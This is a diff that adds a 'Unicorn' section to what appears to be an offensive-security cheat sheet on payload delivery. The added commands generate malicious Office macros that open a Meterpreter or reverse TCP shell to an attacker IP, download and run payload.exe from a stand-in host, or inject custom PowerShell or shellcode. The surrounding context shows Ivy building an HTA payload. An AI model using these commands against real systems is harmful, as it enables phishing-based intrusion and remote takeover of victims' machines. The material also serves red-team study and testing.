@@ -137,6 +137,32 @@ cscript //E:jscript stageless.png
 ./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ATTACKING_IP -delivery hta -stageless
 ```
 {% endtab %}
+
+{% tab title="Unicorn" %}
+[Unicorn](https://github.com/trustedsec/unicorn) is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. It can be used to generate a macro.
+
+```bash
+# Syntax:
+# python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
+
+# Examples:
+# Meterpreter
+python unicorn.py windows/meterpreter/reverse_https <ATTACKING_IP> <ATTACKING_PORT> macro
+
+# Reverse Shell
+python unicorn.py windows/x64/shell_reverse_tcp <ATTACKING_IP> <ATTACKING_PORT> macro
+
+# Download Exec
+python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro
+
+# Custom Powershell script
+python unicorn.py evil.ps1 macro
+
+# Custom shellcode
+# shellcode should be 0x00 formatted
+python unicorn.py <path_to_shellcode.txt> macro
+```
+{% endtab %}
 {% endtabs %}
 
 ## Resources
